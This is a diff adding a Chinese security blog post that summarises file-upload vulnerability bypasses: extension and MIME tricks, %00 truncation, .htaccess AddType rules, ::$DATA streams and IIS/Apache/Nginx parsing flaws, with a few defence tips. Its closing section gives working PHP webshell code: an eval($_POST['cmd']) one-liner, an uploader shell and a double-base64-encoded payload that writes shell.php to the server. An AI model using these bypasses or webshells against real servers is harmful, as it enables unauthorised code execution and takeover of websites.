@@ -1,0 +1,252 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>文件上传总结 | LuoYuのBLOG</title><meta name="description" content="文件上传漏洞 利用必要条件：  上传动态文件或可以形成动态文件 所在目录具有执行权限，上传的文件可执行 能访问到上传的文件   检测流程 客户端检测绕过： 一般只检测后缀名  JavaScript检测  事件检测：onchange onsubmit等事件触发检测函数   删除相关函数或者事件   抓包改包  先上传正常的后缀，之后再改包     %00截断上传 影响版本：5.2.x url解码后形"><meta name="keywords" content="文件上传"><meta name="author" content="LuoYu"><meta name="copyright" content="LuoYu"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/hack1.jpg"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="twitter:card" content="summary"><meta name="twitter:title" content="文件上传总结"><meta name="twitter:description" content="文件上传漏洞 利用必要条件：  上传动态文件或可以形成动态文件 所在目录具有执行权限，上传的文件可执行 能访问到上传的文件   检测流程 客户端检测绕过： 一般只检测后缀名  JavaScript检测  事件检测：onchange onsubmit等事件触发检测函数   删除相关函数或者事件   抓包改包  先上传正常的后缀，之后再改包     %00截断上传 影响版本：5.2.x url解码后形"><meta name="twitter:image" content="http://retnull.top/img/test4.jpg"><meta property="og:type" content="article"><meta property="og:title" content="文件上传总结"><meta property="og:url" content="http://retnull.top/2020/05/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/"><meta property="og:site_name" content="LuoYuのBLOG"><meta property="og:description" content="文件上传漏洞 利用必要条件：  上传动态文件或可以形成动态文件 所在目录具有执行权限，上传的文件可执行 能访问到上传的文件   检测流程 客户端检测绕过： 一般只检测后缀名  JavaScript检测  事件检测：onchange onsubmit等事件触发检测函数   删除相关函数或者事件   抓包改包  先上传正常的后缀，之后再改包     %00截断上传 影响版本：5.2.x url解码后形"><meta property="og:image" content="http://retnull.top/img/test4.jpg"><meta property="article:published_time" content="2020-05-28T14:34:03.000Z"><meta property="article:modified_time" content="2020-11-14T14:45:26.455Z"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="http://retnull.top/2020/05/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/"><link rel="prev" title="文件包含漏洞" href="http://retnull.top/2020/05/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"><link rel="next" title="python安全编程" href="http://retnull.top/2020/05/27/python%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  bookmark: {
+    message_prev: '按',
+    message_next: '键将本页加入书签'
+  },
+  runtime_unit: '天',
+  runtime: true,
+  copyright: undefined,
+  ClickShowText: undefined,
+  medium_zoom: false,
+  fancybox: true,
+  Snackbar: undefined,
+  baiduPush: true,
+  highlightCopy: true,
+  highlightLang: true,
+  highlightShrink: 'false',
+  isFontAwesomeV5: false,
+  isPhotoFigcaption: false
+  
+}</script><script>var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isSidebar: true  
+  }</script><noscript><style>
+#page-header {
+  opacity: 1
+}
+.justified-gallery img{
+  opacity: 1
+}
+</style></noscript><meta name="generator" content="Hexo 4.2.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/dog.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">38</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">57</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">29</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> List</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li></ul></div></div></div></div><i class="fa fa-arrow-right on" id="toggle-sidebar" aria-hidden="true">     </i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#文件上传漏洞"><span class="toc-number">1.</span> <span class="toc-text">文件上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#检测流程"><span class="toc-number">1.1.</span> <span class="toc-text">检测流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#客户端检测绕过："><span class="toc-number">1.2.</span> <span class="toc-text">客户端检测绕过：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JavaScript检测"><span class="toc-number">1.2.1.</span> <span class="toc-text">JavaScript检测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#00截断上传"><span class="toc-number">1.2.2.</span> <span class="toc-text">%00截断上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#APP检测"><span class="toc-number">1.2.3.</span> <span class="toc-text">APP检测</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#服务器检测绕过："><span class="toc-number">1.3.</span> <span class="toc-text">服务器检测绕过：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MIME类型绕过："><span class="toc-number">1.3.1.</span> <span class="toc-text">MIME类型绕过：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#文件内容检测"><span class="toc-number">1.3.2.</span> <span class="toc-text">文件内容检测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#文件后缀"><span class="toc-number">1.3.3.</span> <span class="toc-text">文件后缀</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#编辑器漏洞"><span class="toc-number">1.4.</span> <span class="toc-text">编辑器漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#htaccess"><span class="toc-number">1.5.</span> <span class="toc-text">.htaccess</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#中间间漏洞："><span class="toc-number">1.6.</span> <span class="toc-text">中间间漏洞：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IIS"><span class="toc-number">1.6.1.</span> <span class="toc-text">IIS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Apache"><span class="toc-number">1.6.2.</span> <span class="toc-text">Apache</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NGinx"><span class="toc-number">1.6.3.</span> <span class="toc-text">NGinx</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpinfo与本地文件包含利用"><span class="toc-number">1.7.</span> <span class="toc-text">phpinfo与本地文件包含利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过tips："><span class="toc-number">1.8.</span> <span class="toc-text">绕过tips：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IIS-1"><span class="toc-number">1.8.1.</span> <span class="toc-text">IIS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Apache-1"><span class="toc-number">1.8.2.</span> <span class="toc-text">Apache</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nginx"><span class="toc-number">1.8.3.</span> <span class="toc-text">nginx</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#上传大马"><span class="toc-number">1.9.</span> <span class="toc-text">上传大马</span></a></li></ol></li></ol></div></div></div><div id="body-wrap"><div class="post-bg" id="nav" style="background-image: url(/img/test4.jpg)"><div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">LuoYuのBLOG</a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> List</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li></ul></div></div><span class="toggle-menu close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span></span></div><div id="post-info"><div id="post-title"><div class="posttitle">文件上传总结</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="发表于 2020-05-28 22:34:03"><i class="fa fa-calendar" aria-hidden="true"></i> 发表于 2020-05-28</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="更新于 2020-11-14 22:45:26"><i class="fa fa-history" aria-hidden="true"></i> 更新于 2020-11-14</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">文件上传漏洞</a></span></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"><i class="fa fa-eye post-meta__icon" aria-hidden="true"> </i><span>阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-commentcount"></span></div></div></div></div><main class="layout_post" id="content-inner"><article id="post"><div id="article-container"><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><blockquote>
+<p>利用必要条件：</p>
+<ol>
+<li>上传动态文件或可以形成动态文件</li>
+<li>所在目录具有执行权限，上传的文件可执行</li>
+<li>能访问到上传的文件</li>
+</ol>
+</blockquote>
+<h3 id="检测流程"><a href="#检测流程" class="headerlink" title="检测流程"></a>检测流程</h3><p><img src="/img/loading.gif" class="lazyload" data-src="/2020/05/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/image-20200528225920425.png"  alt="image-20200528225920425"></p>
+<h3 id="客户端检测绕过："><a href="#客户端检测绕过：" class="headerlink" title="客户端检测绕过："></a>客户端检测绕过：</h3><blockquote>
+<p>一般只检测后缀名</p>
+</blockquote>
+<h4 id="JavaScript检测"><a href="#JavaScript检测" class="headerlink" title="JavaScript检测"></a>JavaScript检测</h4><blockquote>
+<ol>
+<li>事件检测：onchange onsubmit等事件触发检测函数</li>
+</ol>
+<blockquote>
+<p>删除相关函数或者事件</p>
+</blockquote>
+<ol start="2">
+<li><p>抓包改包</p>
+<blockquote>
+<p>先上传正常的后缀，之后再改包</p>
+</blockquote>
+</li>
+</ol>
+</blockquote>
+<h4 id="00截断上传"><a href="#00截断上传" class="headerlink" title="%00截断上传"></a><code>%00</code>截断上传</h4><blockquote>
+<p>影响版本：5.2.x</p>
+<p>url解码后形成了0x00 被误以为是字符结束 ereg函数</p>
+<blockquote>
+<p>post 传输的时候<code>%00</code>需要先url解码</p>
+</blockquote>
+</blockquote>
+<h4 id="APP检测"><a href="#APP检测" class="headerlink" title="APP检测"></a>APP检测</h4><h3 id="服务器检测绕过："><a href="#服务器检测绕过：" class="headerlink" title="服务器检测绕过："></a>服务器检测绕过：</h3><h4 id="MIME类型绕过："><a href="#MIME类型绕过：" class="headerlink" title="MIME类型绕过："></a>MIME类型绕过：</h4><blockquote>
+<p>抓包改包即可修改mime文件</p>
+</blockquote>
+<h4 id="文件内容检测"><a href="#文件内容检测" class="headerlink" title="文件内容检测"></a>文件内容检测</h4><blockquote>
+<ol>
+<li><p>检测文件头：</p>
+<blockquote>
+<p>添加合法内容的文件头</p>
+</blockquote>
+</li>
+<li><p>文件内容</p>
+<blockquote>
+<p>图片木马</p>
+</blockquote>
+</li>
+</ol>
+</blockquote>
+<h4 id="文件后缀"><a href="#文件后缀" class="headerlink" title="文件后缀"></a>文件后缀</h4><blockquote>
+<p>多重文件后缀 e.g:<code>webshell.jpg.php</code></p>
+</blockquote>
+<h3 id="编辑器漏洞"><a href="#编辑器漏洞" class="headerlink" title="编辑器漏洞"></a>编辑器漏洞</h3><blockquote>
+<p>常见的编辑器</p>
+</blockquote>
+<h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><blockquote>
+<p>apache 特有的的配置文件</p>
+</blockquote>
+<h3 id="中间间漏洞："><a href="#中间间漏洞：" class="headerlink" title="中间间漏洞："></a>中间间漏洞：</h3><blockquote>
+<h4 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h4><p>asp目录下的文件当做asp来执行</p>
+<p>分号后面的不解析;.jpg</p>
+<h4 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h4><p>从右边到左边执行解析，直到满足服务器执行的</p>
+<h4 id="NGinx"><a href="#NGinx" class="headerlink" title="NGinx"></a>NGinx</h4><blockquote>
+<p>空格结尾</p>
+<p>00截断</p>
+</blockquote>
+</blockquote>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/2020/05/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/image-20200831101731893.png"  alt="image-20200831101731893"></p>
+<blockquote>
+<p><strong><em>IIS/Nginx + PHP fastcgi</em></strong></p>
+<blockquote>
+<p>如果开启了<code>cgi.fic_pathinfo</code>,所执行的文件不存在，就会继续查找上一级的文件是否存在</p>
+<p>例如：<code>index.php/id/2</code></p>
+<p>且未设置：<code>security_extensions</code>该选项限制可以执行的文件类型</p>
+</blockquote>
+<p><strong><em>Nginx 文件名逻辑漏洞</em></strong></p>
+<blockquote>
+<p>上传一个以空格结尾的文件：<code>&quot;abdcd.jpg &quot;</code> </p>
+<p>正常情况下（关闭pathinfo的情况下），只有.php后缀的文件才会被发送给fastcgi解析。</p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/2020/05/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/image-20200529205500933.png"  alt="image-20200529205500933"></p>
+<p>先上传正常文件，然后再在文件的后面加上</p>
+<p>防御：</p>
+<blockquote>
+<p>升级Nginx</p>
+<p>设置<code>security.limit_extensions = .php</code></p>
+</blockquote>
+</blockquote>
+<p><strong><em>Apache解析漏洞</em></strong></p>
+<blockquote>
+<p>如果再Apache的cof中配置如下：</p>
+<p><code>AddHandler application/x-httpd-php .php</code></p>
+<p>则abcde.php.jpg也会被当做php去执行（因为配置要求直到找到可以被Apache解析的文件后缀才执行）</p>
+<p>如果再<code>.htaccess</code>有如下配置，则可以将扩展名<code>.xxx</code>当做PHP执行</p>
+<p><code>AddType application/x-httpd-php xxx</code></p>
+</blockquote>
+<p><strong>* IIS5.x-6.0解析漏洞*</strong></p>
+<blockquote>
+<ol>
+<li><p>上传的文件名<code>abdc.asp:.jpg</code></p>
+<blockquote>
+<p>服务器默认不解析<code>:</code>后面的内容，所以文件被当做asp文件解析</p>
+</blockquote>
+</li>
+<li><p>像<code>xxx.asp</code>目录下上传<code>abcde.jpg</code></p>
+<blockquote>
+<p>服务器会把目录下的文件都当做asp文件解析</p>
+</blockquote>
+</li>
+</ol>
+</blockquote>
+<p><strong><em>判断服务器类型</em></strong></p>
+<blockquote>
+<p>404提示信息</p>
+<p>调试信息中<code>network</code></p>
+</blockquote>
+</blockquote>
+<h3 id="phpinfo与本地文件包含利用"><a href="#phpinfo与本地文件包含利用" class="headerlink" title="phpinfo与本地文件包含利用"></a>phpinfo与本地文件包含利用</h3><blockquote>
+</blockquote>
+<h3 id="绕过tips："><a href="#绕过tips：" class="headerlink" title="绕过tips："></a>绕过tips：</h3><blockquote>
+<ol>
+<li>把<code>php</code>后缀改为<code>phtml .phps php5 .pht .php3 php2</code></li>
+</ol>
+<blockquote>
+<p>条件：<code>AddType application/x-httpd-php .php .phtml .phps .php5 .pht</code></p>
+<p>语法：AddType MIME-type extension [extension] …</p>
+</blockquote>
+<ol start="2">
+<li><code>.htaccess</code></li>
+</ol>
+<blockquote>
+<p>上传并构造:<code>AddType application/x-httpd-php .jpg</code></p>
+<p>生效的条件：<code>mod_rewrite</code>模式开启 <code>AllowOverride All</code></p>
+</blockquote>
+<ol start="3">
+<li><p>大小写绕过</p>
+</li>
+<li><p>空格和点绕过</p>
+</li>
+</ol>
+<blockquote>
+<p>windows中不允许文件后缀有<code>.</code>和空格存在,e.g：<code>&quot;1.php &quot;</code>&amp;<code>&quot;2.php.&quot;</code>由于验证的是后缀 再写入文件系统，所以验证结束windows才去除空格和点</p>
+<p>如果逻辑错误：可以尝试点和空格的组合</p>
+</blockquote>
+<ol start="5">
+<li><code>::$DATA</code></li>
+</ol>
+<blockquote>
+<p>php+windows的情况下：如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件</p>
+<p>payload:<code>xxx.php::$DATA</code></p>
+</blockquote>
+<ol start="6">
+<li>替换为空格时候可以尝试双写绕过</li>
+</ol>
+<blockquote>
+<p>payload:<code>pphphp</code></p>
+</blockquote>
+<ol start="7">
+<li>00截断</li>
+</ol>
+<blockquote>
+<p>move_uploaded_file函数的底层实现类似于C语言，遇到0x00会截断</p>
+<p>条件：<img src="/img/loading.gif" class="lazyload" data-src="/2020/05/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/image-20200529235821815.png"  alt="image-20200529235821815"></p>
+</blockquote>
+<ol start="8">
+<li><p>解析漏洞</p>
+<blockquote>
+<h4 id="IIS-1"><a href="#IIS-1" class="headerlink" title="IIS"></a>IIS</h4><ol>
+<li><p>解析asp格式的时候</p>
+<blockquote>
+<ol>
+<li>像<code>xxx.asp</code>目录下上传<code>abcde.jpg</code></li>
+</ol>
+<p>xxx目录下的所有的文件都会以asp格式解析</p>
+<ol start="2">
+<li>文件名中含有<code>.asp</code>都会优先asp解析</li>
+<li>该版本 默认会将<code>*.asp;.jpg</code>此种格式的文件名， 当成Asp解析， 原理是 服务器默认不解析; 号及其后面的内容， 相当于截断  </li>
+<li>PUT任意文件写入  </li>
+</ol>
+</blockquote>
+</li>
+</ol>
+<h4 id="Apache-1"><a href="#Apache-1" class="headerlink" title="Apache"></a>Apache</h4><blockquote>
+<p><code>则abcde.php.jpg也会被当做php去执行（因为配置要求直到找到可以被Apache解析的文件后缀才执行）</code></p>
+</blockquote>
+<h4 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h4><blockquote>
+<ol>
+<li>test.jpg  ，可以添加为test.jpg/x.php进行解析攻击加空格</li>
+<li>%00.php</li>
+</ol>
+</blockquote>
+</blockquote>
+</li>
+</ol>
+</blockquote>
+<h3 id="上传大马"><a href="#上传大马" class="headerlink" title="上传大马"></a>上传大马</h3><blockquote>
+<p>先上传上传马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@$temp = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">@$file = basename($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span> ($file))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;form action = '' method = 'POST' ENCTYPE='multipart/form-data'&gt;\n"</span>;<span class="keyword">echo</span> <span class="string">"Local file: &lt;input type = 'file' name = 'upload_file'&gt;\n"</span>;<span class="keyword">echo</span> <span class="string">"&lt;input type = 'submit' value = 'Upload'&gt;\n"</span>;<span class="keyword">echo</span> <span class="string">"&lt;/form&gt;\n&lt;pre&gt;\n\n&lt;/pre&gt;"</span>;&#125;<span class="keyword">else</span> &#123;<span class="keyword">if</span>(move_uploaded_file($temp,$file))&#123;<span class="keyword">echo</span> <span class="string">"File uploaded successfully.&lt;p&gt;\n"</span>;&#125;<span class="keyword">else</span> &#123;<span class="keyword">echo</span> <span class="string">"Unable to upload "</span> . $file . <span class="string">".&lt;p&gt;\n"</span>;&#125;&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>原理：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#96;&#96;&#96;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>对上传码二次base64编码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(base64_decode(UEQ5d2FIQWdEUXBBSkhSbGJYQWdQU0FrWDBaSlRFVlRXeWQxY0d4dllXUmZabWxzWlNkZFd5ZDBiWEJmYm1GdFpTZGRPdzBLUUNSbWFXeGxJRDBnWW1GelpXNWhiV1VvSkY5R1NVeEZVMXNuZFhCc2IyRmtYMlpwYkdVblhWc25ibUZ0WlNkZEtUc05DbWxtSUNobGJYQjBlU0FvSkdacGJHVXBLWHNOQ21WamFHOGdJanhtYjNKdElHRmpkR2x2YmlBOUlDY25JRzFsZEdodlpDQTlJQ2RRVDFOVUp5QkZUa05VV1ZCRlBTZHRkV3gwYVhCaGNuUXZabTl5YlMxa1lYUmhKejVjYmlJN1pXTm9ieUFpVEc5allXd2dabWxzWlRvZ1BHbHVjSFYwSUhSNWNHVWdQU0FuWm1sc1pTY2dibUZ0WlNBOUlDZDFjR3h2WVdSZlptbHNaU2MrWEc0aU8yVmphRzhnSWp4cGJuQjFkQ0IwZVhCbElEMGdKM04xWW0xcGRDY2dkbUZzZFdVZ1BTQW5WWEJzYjJGa0p6NWNiaUk3WldOb2J5QWlQQzltYjNKdFBseHVQSEJ5WlQ1Y2JseHVQQzl3Y21VK0lqdDlaV3h6WlNCN2FXWW9iVzkyWlY5MWNHeHZZV1JsWkY5bWFXeGxLQ1IwWlcxd0xDUm1hV3hsS1NsN1pXTm9ieUFpUm1sc1pTQjFjR3h2WVdSbFpDQnpkV05qWlhOelpuVnNiSGt1UEhBK1hHNGlPMzFsYkhObElIdGxZMmh2SUNKVmJtRmliR1VnZEc4Z2RYQnNiMkZrSUNJZ0xpQWtabWxzWlNBdUlDSXVQSEErWEc0aU8zMTlQejQ9)));</span><br></pre></td></tr></table></figure>
+
+<p>上传大马</p>
+</blockquote>
+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">LuoYu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://retnull.top/2020/05/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/">http://retnull.top/2020/05/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://retnull.top" target="_blank">LuoYuのBLOG</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a></div><div class="post_share"><div class="social-share" data-image="/img/test1.jpg" data-sites="wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/2020/05/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"><img class="prev_cover lazyload" data-src="/img/test1.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">文件包含漏洞</div></div></a></div><div class="next-post pull_right"><a href="/2020/05/27/python%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B/"><img class="next_cover lazyload" data-src="/img/test3.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">python安全编程</div></div></a></div></nav></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 By LuoYu</div><div class="framework-info"><span>驱动 </span><a href="https://retnullyu.github.io/" target="_blank" rel="noopener"><span>LuoYu</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://retnullyu.github.io/" target="_blank" rel="noopener"><span>LuoYuの主题</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script defer id="ribbon" src="/js/third-party/canvas-ribbon.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script id="canvas_nest" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="/js/third-party/canvas-nest.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@latest/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@latest/lazysizes.min.js" async=""></script><script src="/js/third-party/click_heart.js"></script><script>var endLoading = function () {
+  document.body.style.overflow = 'auto';
+  document.getElementById('loading-box').classList.add("loaded")
+}
+window.addEventListener('load',endLoading)</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
